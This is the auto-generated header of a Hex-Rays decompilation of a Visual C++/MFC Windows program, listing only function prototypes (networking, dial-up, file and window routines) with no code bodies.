/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// char *__usercall sub_401000@<eax>(_DWORD *a1@<ebx>);
SIZE_T __cdecl sub_40106B(char a1);
// __int64 __usercall sub_4010C7@<edx:eax>(double a1@<st0>);
// int __usercall sub_4010EE@<eax>(int *a1@<ebx>);
// void __usercall sub_401107(int *a1@<ebx>);
int sub_401127();
__int64 __stdcall sub_4017D8(_DWORD **a1);
void sub_4018DD();
int __cdecl sub_4018E4(__int16 *a1, _BYTE *a2);
HANDLE __stdcall sub_401981(void **a1, int a2, int a3);
int sub_402253();
int sub_40228E();
void sub_4022A4();
int sub_4022AB();
int sub_4022C9();
int sub_402338();
int __cdecl sub_40236B(UINT uExitCode); // idb
int nullsub_1(void); // weak
int __cdecl sub_40237D(void *lp); // idb
int __cdecl sub_402383(SIZE_T dwBytes); // idb
_DWORD __cdecl sub_402389(_DWORD); // weak
void ***sub_4023B0();
LPVOID __thiscall sub_4023E0(LPVOID lpMem, char a2);
int sub_402400(void); // weak
int sub_402410();
// int unknown_libname_1(void); weak
// void __cdecl unknown_libname_2(); idb
int sub_402450();
int (__stdcall *sub_402480())(int, int, int);
int (*sub_402490())(void);
HMODULE sub_4024C0();
UINT __cdecl sub_4024F0();
// UINT __usercall sub_402530@<eax>(int a1@<ebx>, int a2);
LPVOID __cdecl sub_402580(SIZE_T dwBytes);
LPVOID __cdecl sub_4025D0(LPVOID lpMem, SIZE_T dwBytes);
void __cdecl sub_402610(void *lp);
int __cdecl sub_402660(int a1);
// __int64 __usercall sub_402680@<edx:eax>(void (__cdecl *a1)(_DWORD, _DWORD, _DWORD)@<eax>, int a2, ...);
void __cdecl sub_402720(int a1, unsigned int Seed, int a3, int a4);
int __cdecl sub_402750(int a1, int a2, int a3, int a4, int a5, int a6, int a7);
int *__cdecl sub_4027D0(int *a1, int a2);
int *__cdecl sub_402840(int a1, double X, unsigned int a3);
char *sub_402B10();
char *sub_402BB0();
BOOL __cdecl sub_402C50(int a1, LPCSTR lpExistingFileName, int a3, int a4, LPCSTR lpNewFileName);
DWORD __cdecl sub_402C70(int a1, LPCSTR lpFileName);
_DWORD *__cdecl sub_402CC0(int a1, LPCSTR lpFileName);
_DWORD *__cdecl sub_402D30(int a1, int a2, int a3, int a4, signed int a5);
int __cdecl sub_402D60(int a1, LPCSTR lpFileName, int a3, int a4, char a5); // idb
BOOL __cdecl sub_402E00(int a1, LPSTR lpCommandLine, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
const char *__cdecl sub_402EF0(int a1, _DWORD *a2);
_DWORD *__cdecl sub_402FD0(int a1, int *a2, int a3, unsigned int a4);
BOOL sub_403090();
char *__cdecl sub_403100(int a1, const char *a2, int a3, int a4, int a5);
BOOL __cdecl sub_403170(LPCSTR lpFileName, int a2, int a3, HANDLE *a4);
HANDLE __cdecl sub_4032C0(HANDLE hFindFile);
CHAR *__cdecl sub_4032E0(int a1, LPCSTR lpName);
void *__cdecl sub_403340(int a1, LPCSTR lpFileName, int a3, int a4, LPCSTR lpAppName, int a6, int a7, LPCSTR lpKeyName, int a9, int a10, LPCSTR lpDefault);
_DWORD *__cdecl sub_4033E0(int a1, LPCSTR lpFileName, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
int __cdecl sub_4034C0(int a1, _DWORD *a2, int a3, int a4, char a5);
BOOL __cdecl sub_4035A0(int a1, LPCSTR lpFileName, int a3, int a4, LPCSTR lpAppName, int a6, int a7, LPCSTR lpKeyName, int a9, int a10, LPCSTR lpString);
void __cdecl sub_4035C0(int a1, HANDLE *a2);
int __cdecl sub_4035D0(int a1, const char *a2, int a3, int a4, char *Str2, int a6, int a7, int a8, int a9, int a10, int a11);
int __stdcall sub_4036A0(int a1, _DWORD *lpMem, int *dwBytes);
int *__cdecl sub_403C00(int *a1, int *a2);
const char *__cdecl sub_403C30(const char *a1);
int __cdecl sub_403C70(char *Buffer, double X, int a3); // idb
_DWORD *__cdecl sub_403E00(const void *a1, unsigned int a2);
int __cdecl sub_403E40(int a1);
void *__cdecl sub_403E70(const void *a1, signed int a2);
void sub_403EB0();
void __cdecl sub_403F20(HANDLE *a1);
LPVOID __cdecl sub_403FA0(_DWORD *a1);
int __cdecl sub_403FD0(_DWORD *a1);
void __cdecl sub_404000(int *lp);
int __cdecl sub_404060(double a1, int *a2, _DWORD *a3, int *a4);
_DWORD *__cdecl sub_4041E0(double a1, int *a2, int *a3, _DWORD *a4);
int sub_404250();
// int unknown_libname_3(void); weak
// void __cdecl unknown_libname_4(); idb
int __stdcall sub_404290(int a1, int a2, int a3);
int __stdcall sub_4042D0(int a1, int (__stdcall *a2)(_DWORD, _DWORD, _DWORD), int a3);
int __cdecl sub_4042F0(int a1);
void __cdecl sub_404310(_DWORD *a1, int a2, int *a3);
void __cdecl sub_4044A0(int a1, int a2, int a3);
unsigned int *__thiscall sub_4044F0(unsigned int *lpMem, char a2);
BOOL __thiscall sub_404510(unsigned int *this);
void __cdecl nullsub_5(); // idb
int sub_404560();
// int unknown_libname_5(void); weak
// void __cdecl unknown_libname_6(); idb
_DWORD *__thiscall sub_4045A0(_DWORD *this);
void __thiscall sub_4045E0(_DWORD *this);
int __stdcall sub_4045F0(int a1, char **a2);
_DWORD *__thiscall sub_404700(_DWORD *this);
void __thiscall sub_404730(_DWORD *this);
HINSTANCE __stdcall sub_404740(LPCSTR lpFile);
int __thiscall sub_4047A0(int this);
void __thiscall sub_4047C0(_DWORD *this, LPVOID lpMem);
int sub_404830();
int sub_404880();
int sub_404890();
int sub_4048A0();
int sub_4048E0();
int sub_404930();
int sub_404940();
int sub_404950();
char *__cdecl sub_404960(const char *a1);
char *__cdecl sub_4049B0(char **a1, int a2, int a3);
int __stdcall sub_4049E0(int a1, int a2, int a3);
int __stdcall sub_404A00(int a1, int a2, int a3);
int __stdcall sub_404A40(int a1, int a2, int a3);
int __cdecl sub_404A60(char *a1, unsigned int a2, char *a3);
void __stdcall sub_404AC0(int a1, int a2, unsigned int a3);
int __thiscall sub_404B10(_DWORD *this, int a2);
int __stdcall sub_4054E0(int *a1, int a2, int a3, int a4, int a5, char a6, int a7);
void __thiscall sub_405530(_DWORD *this);
_DWORD *__thiscall sub_405560(_DWORD *this);
void __stdcall sub_4055A0(int a1, _BYTE *a2, unsigned int a3);
int __thiscall sub_4055F0(int this, char *a2);
unsigned int __thiscall sub_4056E0(_DWORD *this, char *a2, unsigned int a3);
_DWORD *__cdecl sub_4057A0(int a1);
int __cdecl sub_405820(int *a1, int a2);
int __cdecl sub_405980(int a1);
unsigned int __cdecl sub_405AB0(int a1, void *a2, unsigned int a3);
int __cdecl sub_405B30(int a1, int a2);
unsigned int __cdecl sub_405E60(_DWORD *a1, int a2);
int __cdecl sub_405FD0(_DWORD *a1, int a2);
int __cdecl sub_406400(unsigned int a1, unsigned __int8 *a2, unsigned int a3);
_WORD *__cdecl sub_406530(int a1);
_BYTE *__cdecl sub_4065A0(int a1, _BYTE *a2, int a3, int a4);
_WORD *__cdecl sub_406640(int a1, _BYTE *a2, int a3, int a4);
unsigned int __cdecl sub_406830(_DWORD *a1, int *a2);
int __cdecl sub_406A70(int a1, int a2, int a3);
__int16 __cdecl sub_406B50(_DWORD *a1, int *a2);
unsigned int __cdecl sub_406D80(_WORD *a1, int a2, int a3);
int __cdecl sub_406E00(int a1);
int __cdecl sub_406E70(_WORD *a1, int a2, int a3);
int __cdecl sub_406F60(int a1, int a2, int a3, int a4);
int __cdecl sub_4071D0(int a1, unsigned int a2, int a3);
int __cdecl sub_407750(int a1, int a2, int a3);
BOOL __cdecl sub_407B90(int a1);
unsigned int __cdecl sub_407C10(unsigned int a1, int a2);
int __cdecl sub_407C30(int a1);
_BYTE *__cdecl sub_407CB0(_DWORD *a1, _BYTE *a2, int a3, int a4);
void sub_407D60();
int __cdecl sub_407D70(_DWORD *a1, int a2, LPCSTR *a3);
DWORD __cdecl sub_407DD0(HRASCONN a1);
_DWORD *__thiscall sub_407E50(_DWORD *this);
int __thiscall sub_407ED0(SOCKET *this);
BOOL sub_407F40();
int __thiscall sub_407F50(int this);
int sub_407FF0();
// int unknown_libname_8(void); weak
// void __cdecl unknown_libname_9(); idb
int __stdcall sub_408030(int a1, int a2, int a3);
int __stdcall sub_408050(int a1, int a2, int a3);
_DWORD *__cdecl sub_408090(const void *a1, unsigned int a2);
int __stdcall sub_4080E0(int a1, int a2, int a3);
void sub_408110();
_DWORD *__thiscall sub_408120(_DWORD *this);
void __thiscall sub_408150(CDaoRecordset *this);
BOOL __thiscall sub_4081C0(HINTERNET *this);
HINTERNET __thiscall sub_408210(HINTERNET *this);
// void __thiscall CDaoRecordset::ResetCursor(CDaoRecordset *__hidden this); idb
BOOL __thiscall sub_408250(int this, HINTERNET hInternet);
HINTERNET __thiscall sub_4082C0(HINTERNET *this);
int __thiscall sub_4082E0(HINTERNET *this, LPCSTR lpszObjectName, _DWORD *a3);
_DWORD *__thiscall sub_408730(_DWORD *this);
LPVOID __thiscall sub_408750(_DWORD *this, signed int a2);
LPVOID __thiscall sub_408820(int this, signed int a2);
int __thiscall sub_408930(int this);
void __thiscall sub_408950(_DWORD *this, LPVOID lpMem);
int __thiscall sub_4089C0(_DWORD *this, _BYTE *Src, signed int Size);
_BYTE *__cdecl sub_408A20(_BYTE *a1, _BYTE *Src, int Size);
_BYTE *__cdecl sub_408A80(_BYTE *a1, unsigned int a2);
int __cdecl sub_408AD0(_BYTE *a1, int a2, unsigned __int8 a3);
int __cdecl sub_408B20(char *a1);
char *__cdecl sub_408B40(char *a1);
void **__cdecl sub_408B60(int a1, int a2, int a3, int a4, void **a5);
void **__cdecl sub_408C20(CHAR *lpString, CString *a2);
_BYTE *__cdecl sub_408C80(int a1, int a2, _DWORD *a3, int a4);
_DWORD *__thiscall sub_408EA0(_DWORD *this);
int __thiscall sub_408EB0(SOCKET *this);
BOOL __thiscall sub_408EC0(SOCKET *this, char *buf, int len);
int __thiscall sub_408EF0(SOCKET *this, char *buf, int len);
int __thiscall sub_408F10(SOCKET *this);
int __thiscall sub_408F30(SOCKET *this, _DWORD *a2);
_DWORD *__thiscall sub_408FA0(_DWORD *this);
int __thiscall sub_408FC0(int this, const char **a2);
void **__thiscall sub_409020(void **this, const char **a2);
CString *__thiscall sub_409050(void *this, CString *a2);
void __thiscall sub_409120(_DWORD *this);
_DWORD *__thiscall sub_409190(_DWORD *this);
void __thiscall sub_409210(int this);
void __thiscall sub_4093A0(_DWORD *this);
void __thiscall sub_4093F0(void **this);
void __thiscall sub_4094A0(int this);
int __thiscall sub_409500(_DWORD *this, int a2);
int __thiscall sub_409530(_DWORD *this, int a2, int a3, int a4);
int __thiscall sub_409670(_DWORD *this, int a2);
int __thiscall sub_409680(_DWORD *this);
void __stdcall __noreturn sub_409690(int a1);
_DWORD *__thiscall sub_409B20(_DWORD *this);
int __thiscall sub_409B90(SOCKET *this);
int __thiscall sub_409C10(SOCKET *this);
int __fastcall sub_409CA0(int a1, int a2, int a3);
CString *__thiscall sub_40A0D0(_DWORD *this, CString *a2, int a3);
int __thiscall sub_40A100(_DWORD *this, int a2, int a3);
void __thiscall sub_40A130(void *this);
void __thiscall sub_40A1C0(int this, CArchive *a2);
void __thiscall sub_40A390(_DWORD *this);
void __thiscall sub_40A3E0(int this, CArchive *a2);
LPVOID __thiscall sub_40A570(LPVOID lpMem, char a2);
_DWORD *__thiscall sub_40A590(_DWORD *lpMem, char a2);
void __thiscall sub_40A5B0(int this, int a2, int a3);
_DWORD *__stdcall sub_40A730(_DWORD *a1, _DWORD *a2);
int sub_40A780();
CException *__thiscall sub_40A7A1(CException *this, int a2, int a3);
_DWORD *__thiscall sub_40A7CB(_DWORD *lpMem, char a2);
void __thiscall sub_40A7E7(_DWORD *this);
CException *__thiscall sub_40A7EE(CException *this, int a2, int a3);
_DWORD *__thiscall sub_40A818(_DWORD *lpMem, char a2);
void __thiscall sub_40A834(_DWORD *this);
BOOL __thiscall sub_40A83B(HDC *this, int x, int y);
BOOL __thiscall sub_40A84F(HDC *this, RECT *lprect);
BOOL __thiscall sub_40A85F(HDC *this, int x, int y, LPCSTR lpString, int c);
int __thiscall sub_40A8D8(HDC *this, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format);
int __thiscall sub_40A924(HDC *this, int iEscape, int cjIn, LPCSTR pvIn, LPVOID pvOut);
// _DWORD __stdcall CArchive::operator<<(char); weak
// _DWORD __stdcall CArchive::operator<<(__int16); weak
// _DWORD __stdcall sub_40A98A(_DWORD); weak
BOOL __thiscall sub_40AA47(HWND *this);
_DWORD *__thiscall sub_40AA5F(_DWORD *lpMem, char a2);
void __thiscall sub_40AA7B(_DWORD *this);
CException *__thiscall sub_40AAA7(CException *this, int a2, int a3);
_DWORD *__thiscall sub_40AAD1(_DWORD *lpMem, char a2);
void __thiscall sub_40AAED(_DWORD *this);
CException *__thiscall sub_40AAF4(CException *this, int a2, int a3);
_DWORD *__thiscall sub_40AB1E(_DWORD *lpMem, char a2);
void __thiscall sub_40AB3A(_DWORD *this);
int __stdcall sub_40AB41(int a1, int a2);
LPVOID __thiscall sub_40AB47(LPVOID lpMem, char a2);
void *__thiscall sub_40AB63(int this);
BOOL sub_40AB9D();
HMONITOR __stdcall sub_40AC75(LPCRECT lprc, DWORD dwFlags);
BOOL __stdcall sub_40AD36(HMONITOR hMonitor, LPMONITORINFO lpmi);
_DWORD *__thiscall sub_40ADED(_DWORD *lpMem, char a2);
int __thiscall sub_40AE09(_DWORD *this);
char *__thiscall sub_40AE51(char *this, int a2, int a3);
void __thiscall sub_40AE8D(int this);
_DWORD *__thiscall sub_40AEB5(char *this);
void __thiscall sub_40AF44(int this, _DWORD *a2);
// _DWORD __stdcall unknown_libname_18(_DWORD); weak
_DWORD *__thiscall sub_40AF7F(_DWORD *lpMem, char a2);
void *__thiscall sub_40AF9B(_DWORD *this);
unsigned int *__thiscall sub_40AFCD(unsigned int *lpMem, char a2);
BOOL __thiscall sub_40AFE9(unsigned int *this);
// int __cdecl atexit(void (__cdecl *)());
// void __cdecl __noreturn _amsg_exit(DWORD NumberOfBytesWritten); idb
// void __cdecl srand(unsigned int Seed);
// int __cdecl VC8_Random_40B22F();
// int sprintf(char *const Buffer, const char *const Format, ...);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
// char *__cdecl strrchr(const char *Str, int Ch);
// double __cdecl modf(double X, double *Y);
// _DWORD __cdecl _local_unwind2(_DWORD, _DWORD); weak
void __cdecl sub_40B886(LPVOID lpMem);
// void *__cdecl malloc(size_t Size);
LPVOID __cdecl sub_40B9AD(unsigned int a1);
// int __cdecl vsprintf(char *const Buffer, const char *const Format, va_list ArgList);
// int __cdecl _strcmpi(const char *String1, const char *String2);
// int __cdecl atol(const char *String);
// int __cdecl atoi(const char *String);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
void *__cdecl sub_40C111(LPVOID lpMem, SIZE_T dwBytes);
// int __cdecl _except_handler3(int, PVOID TargetFrame, int); idb
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// int __cdecl _ismbcdigit(unsigned int C);
// char *__cdecl strncpy(char *Destination, const char *Source, size_t Count);
// char *__cdecl strstr(const char *Str, const char *SubStr);
int __cdecl sub_40CB32(int a1, int a2);
// char *__cdecl strchr(const char *Str, int Val);
// void *__cdecl memset(void *, int Val, size_t Size);
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);
// void *__cdecl memcpy_0(void *, const void *Src, size_t Size);
// size_t __cdecl wcslen(const wchar_t *String);
// unsigned __int8 *__cdecl _mbsinc(const unsigned __int8 *Ptr);
// size_t __cdecl _mbscspn(const unsigned __int8 *String, const unsigned __int8 *Control);
// size_t __cdecl _mbclen(const unsigned __int8 *String);
// size_t __cdecl strlen(const char *Str);
// int __cdecl _mbsnbcmp(const unsigned __int8 *Str1, const unsigned __int8 *Str2, size_t MaxCount);
unsigned int __cdecl sub_40D7AA(unsigned __int8 *a1, unsigned int a2, unsigned __int8 *a3, int a4);
unsigned int __cdecl sub_40D7C5(unsigned __int8 *a1, unsigned int a2, unsigned __int8 *a3, int a4, char **a5);
// _DWORD __cdecl _expandtime(char, _DWORD, _DWORD, _DWORD, _DWORD); weak
void __cdecl sub_40DD8D(char *String1, int a2, _DWORD *a3, _DWORD *a4, int a5);
LPVOID __cdecl sub_40E599(LPVOID lpMem, unsigned int a2);
SIZE_T __cdecl sub_40E6FD(_DWORD *lpMem);
int *__cdecl sub_40E7EB(unsigned int a1);
// int *__cdecl _errno();
// unsigned int *__cdecl __doserrno();
// int __cdecl strtol(const char *String, char **EndPtr, int Radix);
int sub_40EC58();
// _DWORD __cdecl flsall(_DWORD); weak
void __noreturn sub_40ED82(); // weak
char __cdecl sub_40F61D(int a1);
int sub_40F64A();
int __cdecl sub_40F792(int a1);
int *__cdecl sub_40F828(DWORD NumberOfBytesWritten);
int __cdecl sub_40FA93(FILE *File, char *a2, int a3);
// int __cdecl write_char(int, FILE *File, int); idb
// int __cdecl write_multi_char(int, int, FILE *File, int); idb
// int __cdecl write_string(int, int, FILE *File, int); idb
// _DWORD __cdecl get_int_arg(_DWORD); weak
// _DWORD __cdecl get_int64_arg(_DWORD); weak
// _DWORD __cdecl get_short_arg(_DWORD); weak
// void __cdecl __noreturn terminate(); idb
// void __usercall __noreturn sub_41192D(EXCEPTION_POINTERS *a1@<ecx>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
// _DWORD __cdecl __sbh_heap_init(_DWORD); weak
// _DWORD __cdecl __sbh_find_block(_DWORD); weak
_DWORD *__cdecl sub_4119F6(_DWORD *a1, int a2);
// _DWORD __cdecl __sbh_alloc_block(_DWORD); weak
// _DWORD __cdecl __sbh_resize_block(_DWORD, _DWORD, _DWORD); weak
void **sub_4124CA();
void **__cdecl sub_41260E(void **lpMem);
void __cdecl sub_412664(int a1);
unsigned int __cdecl sub_412726(unsigned int a1, void ***a2, unsigned int *a3);
void __cdecl sub_41277D(int a1, int a2, _BYTE *a3);
int __cdecl sub_4127C2(unsigned int a1);
int __cdecl sub_4129CA(int a1, unsigned int a2, unsigned int a3);
int __cdecl sub_412AEE(int a1, _DWORD *a2, _BYTE *a3, unsigned int a4);
// _DWORD __cdecl _lock(_DWORD); weak
// _DWORD __cdecl _unlock(_DWORD); weak
// int __cdecl _callnewh(size_t Size);
// char *__cdecl strcpy(char *Destination, const char *Source);
// char *__cdecl strcat(char *Destination, const char *Source);
// LONG __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
LONG (__stdcall *sub_413176())(struct _EXCEPTION_POINTERS *ExceptionInfo);
LPTOP_LEVEL_EXCEPTION_FILTER sub_413187();
// _DWORD __cdecl __crtMessageBoxA(_DWORD, _DWORD, _DWORD); weak
// int __cdecl wctomb(char *MbCh, wchar_t WCh);
// _DWORD __cdecl _ld12cvt(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_4147FC(int a1, int a2);
int __cdecl sub_414812(int a1, int a2);
int __cdecl sub_414828(int a1, int a2);
int __cdecl sub_414855(int a1, int a2);
int sub_414A14();
// _DWORD __cdecl __strgtold12(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl _strnicmp(const char *String1, const char *String2, size_t MaxCount);
// void __thiscall std::locale::~locale(std::locale *__hidden this); idb
int sub_4160A2();
int nullsub_9(void); // weak
void __cdecl sub_4160B9(); // idb
int sub_4160ED();
void __cdecl nullsub_3(); // idb
int sub_416130();
int sub_416172();
// int __stdcall WSACleanup();
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// int __stdcall closesocket(SOCKET s);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
// DWORD __stdcall RasGetConnectStatusA(HRASCONN, struct tagRASCONNSTATUSA *);
// DWORD __stdcall RasHangUpA(HRASCONN);
// int __stdcall AfxInitialize(int, unsigned int); idb
void __cdecl sub_41624A(); // idb
int sub_416262();
CString *__thiscall sub_416280(LPCSTR *this, CString *a2, void *Size);
CString *__thiscall sub_4162F8(const unsigned __int8 **this, CString *a2, unsigned __int8 *Control);
void __thiscall sub_416323(CString *this, char *Format, va_list a3);
void __cdecl sub_416670(CString *a1, char *Format, int a3);
void __stdcall __noreturn sub_4166EF(int a1);
_DWORD *__thiscall sub_41676C(_DWORD *this);
CStringArray *__thiscall sub_416783(CStringArray *lpMem, char a2);
// void __thiscall CStringArray::~CStringArray(CStringArray *__hidden this); idb
// void __thiscall CStringArray::SetSize(CStringArray *__hidden this, int, int); idb
int __thiscall sub_416948(CStringArray *this, int a2, LPCSTR lpString);
_DWORD *__thiscall sub_4169DD(_DWORD *this, int a2);
_DWORD *__thiscall sub_416A00(_DWORD *lpMem, char a2);
// int __cdecl sub_416A1C(_DWORD); weak
int __thiscall sub_416A3C(_DWORD *this);
_DWORD __stdcall sub_416A65(_DWORD); // weak
int __thiscall sub_416A7E(_DWORD *this);
// struct CPlex *__stdcall CPlex::Create(struct CPlex **, unsigned int, unsigned int); idb
// void __thiscall CPlex::FreeDataChain(CPlex *__hidden this); idb
_DWORD *__thiscall sub_416AD8(_DWORD *this, int a2);
_DWORD *__thiscall sub_416AFF(_DWORD *lpMem, char a2);
void __thiscall sub_416B1B(int this, int a2, int a3);
// int __cdecl sub_416B60(_DWORD); weak
int __thiscall sub_416B8B(_DWORD *this);
int *__thiscall sub_416BB4(int this);
_DWORD __stdcall sub_416C01(_DWORD); // weak
// _DWORD __stdcall sub_416C1A(_DWORD, _DWORD); weak
// void *__thiscall CMapPtrToPtr::GetValueAt(CMapPtrToPtr *__hidden this, void *); idb
int *__thiscall sub_416C7F(_DWORD *this, int a2);
int __thiscall sub_416CCF(_DWORD *this, unsigned int a2);
int __thiscall sub_416D11(_DWORD *this, _DWORD **a2, _DWORD *a3, _DWORD *a4);
void **sub_416D83();
int __thiscall sub_416DAB(_DWORD *this, int a2, int a3);
int __stdcall sub_416DE2(CObject *a1, int a2); // idb
BOOL __thiscall sub_416E59(CWinThread *this, int a2);
// struct CWinThread *__stdcall AfxGetThread(); idb
int __thiscall sub_416FF6(char *this);
int __thiscall sub_417075(_DWORD *this, _DWORD *a2);
int __thiscall sub_4170CE(_DWORD *this);
// int __thiscall CWinThread::OnIdle(CWinThread *__hidden this, int); idb
int __thiscall sub_4171DD(void *this, _DWORD *a2);
int __thiscall sub_417258(void *this, HWND *a2);
// _DWORD __stdcall unknown_libname_19(_DWORD, _DWORD); weak
// int __stdcall IsHelpKey(struct tagMSG *); idb
int __thiscall sub_41737D(_DWORD *this, int a2, struct tagMSG *a3);
BOOL __thiscall sub_4174E2(char *this);
_DWORD *__thiscall sub_417522(_DWORD *this);
int __thiscall sub_41753C(_DWORD *this);
int __stdcall sub_417567(int a1, int a2, int a3, int (__thiscall *a4)(_DWORD, _DWORD), _DWORD *a5, unsigned int a6, _DWORD *a7);
int __thiscall sub_41766E(void *this, int a2, unsigned int a3, _DWORD *Buf1, _DWORD *a5);
int __stdcall sub_41777D(int a1);
int sub_41778B();
int sub_4177A0();
void *sub_4177B5();
void *sub_4177BB();
void *sub_4177C1();
void *sub_4177C7();
void __thiscall sub_4177CD(void *this);
int sub_4177FF();
int __stdcall sub_417803(int a1);
void *sub_417808();
void *sub_41780E();
// CCmdUI *__thiscall CCmdUI::CCmdUI(CCmdUI *__hidden this); idb
int __thiscall sub_41783A(int this, int a2);
void __thiscall sub_41792C(UINT *this, int a2);
void __thiscall sub_417982(UINT_PTR *this, LPCSTR lpNewItem);
void __noreturn sub_4179D9(); // weak
void *__cdecl sub_4179F3(size_t Size);
void __cdecl sub_417A1C(LPVOID lpMem);
CString *__thiscall sub_417A27(CString *this, LPCSTR *a2);
int sub_417A5A();
char *sub_417A64();
void __cdecl sub_417A7F(); // idb
int sub_417A89();
char *sub_417A93();
void __cdecl sub_417AB1(); // idb
int sub_417ABB();
char *sub_417AC5();
void __cdecl sub_417AE3(); // idb
int sub_417AED();
char *sub_417AF7();
void __cdecl sub_417B15(); // idb
void *__thiscall sub_417B1F(_DWORD *this, int a2);
void __thiscall sub_417BA1(_DWORD *lpMem);
volatile LONG *__thiscall sub_417BE9(void **this);
void __stdcall sub_417C1A(volatile LONG *lpAddend);
// void __thiscall CString::Empty(CString *__hidden this); idb
void __thiscall sub_417CB2(_DWORD *this);
_DWORD *__thiscall sub_417CDC(_DWORD *this, _DWORD *a2, size_t Size, int a4, int a5);
CString *__thiscall sub_417D20(CString *this, LPCSTR lpString);
// void __thiscall CString::AssignCopy(CString *__hidden this, size_t Size, const char *); idb
void **__thiscall sub_417D9F(void **this, const char **a2);
// int __thiscall CString::operator=(CString *this, LPCSTR lpString); idb
// int __thiscall CString::operator=(CString *this, wchar_t *String); idb
void *__thiscall sub_417E57(void **this, size_t Size, void *Src, size_t a4, void *a5);
void __thiscall sub_417E95(void **this, size_t Size, void *Src);
void **__thiscall sub_417EF4(void **this, CHAR *lpString);
// _DWORD __stdcall CString::operator+=(_DWORD); weak
_DWORD *__thiscall sub_417F33(_DWORD *this, int a2);
// void __thiscall CString::ReleaseBuffer(CString *__hidden this, int); idb
// char *__thiscall CString::GetBufferSetLength(CString *__hidden this, int); idb
char **sub_418000();
// int __thiscall CObject::IsKindOf(CObject *__hidden this, const struct CRuntimeClass *); idb
int __thiscall sub_418018(_DWORD *this);
void __stdcall sub_41805E(void *a1);
// CException *__thiscall CException::CException(CException *__hidden this); idb
// CException *__thiscall CException::CException(CException *__hidden this, int); idb
// void __thiscall CException::Delete(CException *__hidden this); idb
int __thiscall sub_4180C5(void *this, UINT uType, unsigned int a3);
// AFX_EXCEPTION_LINK *__thiscall AFX_EXCEPTION_LINK::AFX_EXCEPTION_LINK(AFX_EXCEPTION_LINK *__hidden this); idb
// void __stdcall AfxTryCleanup(); idb
int __thiscall sub_418176(_DWORD **this, int a2, int a3, int a4);
LONG __thiscall sub_41818D(int this);
LONG __thiscall sub_4181A7(int this);
int __thiscall sub_418210(int this, int nCmdShow);
int __thiscall sub_418237(int this);
// int __thiscall CWnd::ShowWindow(CWnd *__hidden this, int); idb
struct CObject *__thiscall sub_418279(int this);
void __thiscall sub_41829A(int this, int a2);
UINT sub_4182DC();
int sub_4182ED();
_DWORD *sub_4182F7();
// void __cdecl unknown_libname_20(); idb
int sub_41832B();
_DWORD *sub_418335();
// void __cdecl unknown_libname_21(); idb
int sub_418369();
_DWORD *sub_418373();
// void __cdecl unknown_libname_22(); idb
int sub_4183A7();
_DWORD *sub_4183B1();
// void __cdecl unknown_libname_23(); idb
_DWORD *__thiscall sub_4183E5(_DWORD *this);
CWnd *__thiscall sub_418407(CWnd *lpMem, char a2);
_DWORD *__thiscall sub_418423(_DWORD *this, int a2);
// void __stdcall _AfxPreInitDialog(struct CWnd *, LPRECT lpRect, unsigned int *); idb
// void __stdcall _AfxPostInitDialog(struct CWnd *, const struct tagRECT *, __int16); idb
// void __stdcall _AfxHandleActivate(struct CWnd *, WPARAM wParam, struct CWnd *); idb
// int __stdcall _AfxHandleSetCursor(struct CWnd *, unsigned int, unsigned int); idb
struct CWnd *__stdcall sub_4185C2(struct CWnd *a1, unsigned int a2, CException *a3, int a4, int a5);
int __thiscall sub_4186F4(void *this);
// struct CHandleMap *__stdcall afxMapHWND(LPVOID lpMem); idb
struct CObject *__stdcall sub_41878D(void *a1);
void *__stdcall sub_4187B4(void *a1);
int __thiscall sub_4187D2(_DWORD *this, int a2);
unsigned int __thiscall sub_41880B(unsigned int *this);
LRESULT __stdcall sub_418839(HWND hWnd, CException *Msg, WPARAM wParam, LPARAM lParam);
LRESULT (__stdcall *sub_418884())(HWND hWnd, CException *Msg, WPARAM wParam, LPARAM lParam);
LRESULT __stdcall sub_41888A(HWND hWnd, UINT Msg, WPARAM wParam, unsigned int lParam);
// int __stdcall _AfxGrayBackgroundWndProc(HWND, UINT Msg, HDC hdc, HWND hWnd); idb
LRESULT __stdcall sub_418A65(int code, HWND wParam, int *lParam);
// void __stdcall AfxHookWindowCreate(struct CWnd *); idb
// int __stdcall AfxUnhookWindowCreate(); idb
BOOL __thiscall sub_418CE9(struct CWnd *this, int a2, const CHAR *a3, const CHAR *a4, int a5, int a6, int a7, int a8, int a9, HWND a10, HMENU a11, void *a12);
int __stdcall sub_418DAF(int a1);
BOOL __thiscall sub_418DCF(struct CWnd *this, const CHAR *a2, const CHAR *a3, int a4, int *a5, int a6, HMENU a7, void *a8);
// void __thiscall CWnd::~CWnd(CWnd *__hidden this); idb
int __thiscall sub_418FC8(int *this);
int __thiscall sub_418FD9(int this);
LRESULT __thiscall sub_419026(void *this, UINT Msg, WPARAM wParam, LPARAM lParam);
char *__thiscall sub_41906D(char *this);
__int16 __stdcall sub_419090(int a1);
int __thiscall sub_419158(void *this, int a2, int a3);
void *__stdcall sub_41920A(int a1, int a2);
int __thiscall sub_41926D(HWND *this, int a2, _DWORD *a3);
int __stdcall sub_4192E5(WNDCLASSA *lpWndClass); // idb
int __thiscall sub_4193CC(HWND *this, ULONG_PTR dwData, UINT uCommand);
void **sub_4194AE();
// _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD, _DWORD, _DWORD); weak
